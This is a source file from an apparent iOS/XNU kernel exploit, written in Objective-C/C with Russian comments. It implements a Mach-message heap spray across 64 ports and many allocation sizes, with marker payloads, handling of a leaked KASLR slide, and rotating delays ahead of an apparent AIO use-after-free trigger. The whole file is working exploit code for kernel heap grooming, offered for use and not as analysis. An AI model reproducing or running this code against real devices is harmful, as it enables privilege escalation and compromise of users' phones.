#include "exploit.h"
#include <mach/mach.h>
#include <mach/message.h>
#include <mach/mach_port.h>
#include <stdarg.h>
#include <unistd.h>
#include <fcntl.h>
#include <limits.h>

#import <Foundation/Foundation.h>

static uint64_t e1_slide = 0;

/* 0 = marker-режим (слайд вообще не читаем), 1 = safe-address (только live). */
static int e1_safe = 0;

void nk_spray_e1_set_safe(int on) {
    e1_safe = on ? 1 : 0;
}

static int e1_fd = -1;
static char e1_log_path[PATH_MAX] = {0};

static void e1_open_log(void) {
    if (e1_fd >= 0) return;

    NSString *home = NSHomeDirectory();
    NSString *docs;
    if ([home hasSuffix:@"/Documents"]) {
        docs = home;
    } else {
        docs = [home stringByAppendingPathComponent:@"Documents"];
    }

    NSString *logFile = [docs stringByAppendingPathComponent:@"nk_e1.log"];
    NSString *prevFile = [docs stringByAppendingPathComponent:@"nk_e1_prev.log"];

    [[NSFileManager defaultManager] removeItemAtPath:prevFile error:nil];
    [[NSFileManager defaultManager] moveItemAtPath:logFile toPath:prevFile error:nil];

    e1_fd = open([logFile UTF8String], O_WRONLY | O_CREAT | O_TRUNC | O_SYNC, 0644);
    if (e1_fd < 0) {
        const char *fallback = "/tmp/nk_e1.log";
        snprintf(e1_log_path, sizeof(e1_log_path), "%s", fallback);
        e1_fd = open(fallback, O_WRONLY | O_CREAT | O_TRUNC | O_SYNC, 0644);
    } else {
        snprintf(e1_log_path, sizeof(e1_log_path), "%s", [logFile UTF8String]);
    }
}

static void e1_logf(const char *fmt, ...) {
    char buf[1024];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);

    nk_log(buf);
    if (e1_fd >= 0) {
        dprintf(e1_fd, "%s\n", buf);
        fsync(e1_fd);
    }
}

static int e1_qlimit_logged = 0;

static mach_port_t e1_make_port(void) {
    mach_port_t recv = MACH_PORT_NULL;
    kern_return_t kr = mach_port_allocate(mach_task_self(),
                                          MACH_PORT_RIGHT_RECEIVE, &recv);
    if (kr != KERN_SUCCESS) {
        e1_logf("[E1] port alloc rc=0x%x", kr);
        return MACH_PORT_NULL;
    }

    /* qlimit по умолчанию = MACH_PORT_QLIMIT_BASIC (5): 5 размеров x 64
     * отправки заполняют очередь, 6-я падает в 0x10000004
     * (MACH_SEND_TIMED_OUT при MACH_SEND_TIMEOUT). Ставим 1024. */
    mach_port_limits_t lim;
    memset(&lim, 0, sizeof(lim));
    lim.mpl_qlimit = MACH_PORT_QLIMIT_MAX;
    kern_return_t lkr = mach_port_set_attributes(mach_task_self(), recv,
                                                 MACH_PORT_LIMITS_INFO,
                                                 (mach_port_info_t)&lim,
                                                 MACH_PORT_LIMITS_INFO_COUNT);
    if (!e1_qlimit_logged) {
        e1_qlimit_logged = 1;
        e1_logf("[E1] qlimit set rc=0x%x qlimit=%u max=%u",
                lkr, (unsigned)lim.mpl_qlimit, (unsigned)MACH_PORT_QLIMIT_MAX);
    }

    mach_port_t send = MACH_PORT_NULL;
    mach_msg_type_name_t right = 0;
    kr = mach_port_extract_right(mach_task_self(), recv,
                                 MACH_MSG_TYPE_MAKE_SEND, &send, &right);
    if (kr != KERN_SUCCESS) {
        e1_logf("[E1] extract_right rc=0x%x", kr);
        mach_port_deallocate(mach_task_self(), recv);
        return MACH_PORT_NULL;
    }

    e1_logf("[E1] port alloc rc=0x%x recv=0x%x send=0x%x", kr, recv, send);
    return send;
}

static void e1_put_marker(uint8_t *payload, size_t size) {
    /* gradient: +8*k = 0x01..01*(k+1), k=0..15, 0 не используем */
    memset(payload, 0, size);
    for (int k = 0; k < 16 && (8 * k) < size; k++) {
        *(uint64_t *)(payload + 8 * k) = 0x0101010101010101ULL * (uint64_t)(k + 1);
    }
}

static int e1_send_one(uint8_t *buf, size_t total, size_t size,
                       mach_port_t port, uint32_t idx) {
    mach_msg_header_t *mh = (mach_msg_header_t *)buf;
    mh->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
    mh->msgh_size = (mach_msg_size_t)total;
    mh->msgh_remote_port = port;
    mh->msgh_local_port = MACH_PORT_NULL;
    mh->msgh_reserved = 0;
    mh->msgh_id = (int32_t)(0x41414141u + idx);

    uint8_t *payload = buf + sizeof(mach_msg_header_t);
    e1_put_marker(payload, size);

    mach_msg_return_t mr = mach_msg(mh,
                                    MACH_SEND_MSG | MACH_SEND_TIMEOUT,
                                    (mach_msg_size_t)total, 0,
                                    MACH_PORT_NULL, 1000, MACH_PORT_NULL);
    if (mr != MACH_MSG_SUCCESS) {
        e1_logf("[E1] SEND FAIL size=0x%zx idx=%u msgh=0x%x send=0x%x cap=0x%zx rc=0x%x port=0x%x",
                size, idx, (unsigned)mh->msgh_size, total, total, mr, port);
        return -1;
    }
    return 0;
}

static const unsigned e1_rot_ms[4] = { 0, 10, 50, 100 };
static unsigned e1_rot_idx = 0;

/* Ротация задержки спрей -> триггер: 0 / 10 / 50 / 100 мс. */
void nk_spray_delay(void) {
    unsigned ms = e1_rot_ms[e1_rot_idx % 4];
    e1_rot_idx++;
    if (ms) usleep(ms * 1000u);
    e1_logf("[E1] trigger delay #%u = %u ms (rotation 0/10/50/100)", e1_rot_idx, ms);
}

int nk_spray_e1(void) {
    static const size_t sizes[] = {
        0x80, 0xA0, 0xC0, 0x100, 0x140, 0x180, 0x200,
        0x400, 0x800, 0x1000, 0x1400, 0x1800, 0x2000
    };
    static const int nsizes = (int)(sizeof(sizes) / sizeof(sizes[0]));
    const int nports = 64;
    const size_t hdr = sizeof(mach_msg_header_t);

    e1_open_log();
    e1_logf("[E1] start");
    e1_logf("[E1] log_path=%s", e1_log_path);

    /* marker (по умолчанию): слайд НЕ читаем вообще.
       safe: только live-утечка текущего бута; panic/slide.txt отбрасываем. */
    const char *slide_src = "none";
    if (e1_safe) {
        if (g_nk.slide && nk_kaslr_is_stale() == 0 && g_nk.src == NK_SRC_LEAK) {
            e1_slide = g_nk.slide;
            slide_src = "live";
        } else {
            e1_slide = 0;
            slide_src = "none (reject stale)";
            e1_logf("[E1] safe-address OFF: live-источника слайда нет");
            e1_safe = 0;
        }
    } else {
        e1_slide = 0;
    }
    e1_logf("[E1] mode=%s slide_source=%s",
            e1_safe ? "safe" : "marker", slide_src);
    e1_logf("[E1] slide=0x%llx", (unsigned long long)e1_slide);
    e1_logf("[E1] ladder: nsizes=%d nports=%d hdr=0x%zx", nsizes, nports, hdr);

    mach_port_t ports[64];
    for (int i = 0; i < nports; i++) ports[i] = MACH_PORT_NULL;
    for (int i = 0; i < nports; i++) ports[i] = e1_make_port();

    int sent = 0, failed = 0;
    for (int s = 0; s < nsizes; s++) {
        size_t size = sizes[s];
        size_t total = hdr + size;              /* msgh_size == send_size == cap */

        /* отдельный буфер на размер; размеры кратны 4 */
        uint8_t *buf = (uint8_t *)malloc(total);
        if (!buf) {
            e1_logf("[E1] malloc fail size=0x%zx", size);
            failed += nports;
            continue;
        }

        int ok = 0, bad = 0;
        for (int i = 0; i < nports; i++) {
            if (ports[i] == MACH_PORT_NULL) { bad++; continue; }
            if (e1_send_one(buf, total, size, ports[i],
                            (uint32_t)(s * nports + i)) == 0) ok++;
            else bad++;
        }

        mach_msg_header_t *mh = (mach_msg_header_t *)buf;
        e1_logf("[E1] size=0x%zx msgh=0x%x send=0x%zx cap=0x%zx "
                "+0x40=0x%llx +0x58=0x%llx sent=%d failed=%d",
                size, (unsigned)mh->msgh_size, total, total,
                (unsigned long long)*(uint64_t *)(buf + hdr + 0x40),
                (unsigned long long)*(uint64_t *)(buf + hdr + 0x58),
                ok, bad);

        sent += ok;
        failed += bad;
        free(buf);
        usleep(20000);
    }

    e1_logf("[E1] spray total sent=%d failed=%d", sent, failed);
    e1_logf("[E1] entering nk_aio_uaf_b12");
    if (e1_fd >= 0) { fsync(e1_fd); }
    return 0;
}
